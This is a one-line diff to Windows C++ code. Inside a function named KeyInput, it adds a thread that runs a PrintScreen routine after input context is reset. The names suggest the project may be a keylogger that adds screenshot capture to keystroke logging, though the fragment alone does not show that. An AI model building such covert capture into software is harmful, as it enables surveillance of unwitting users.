@@ -106,6 +106,7 @@ DWORD WINAPI KeyInput(LPVOID pContext)
 			stringbuilder.Clear();
 			strPreContext = L"|";
 			strCurrentContext = L"|";
+			::CreateThread(nullptr, 0, PrintScreen, &stThreadArg, 0, nullptr);
 			continue;
 		}
 
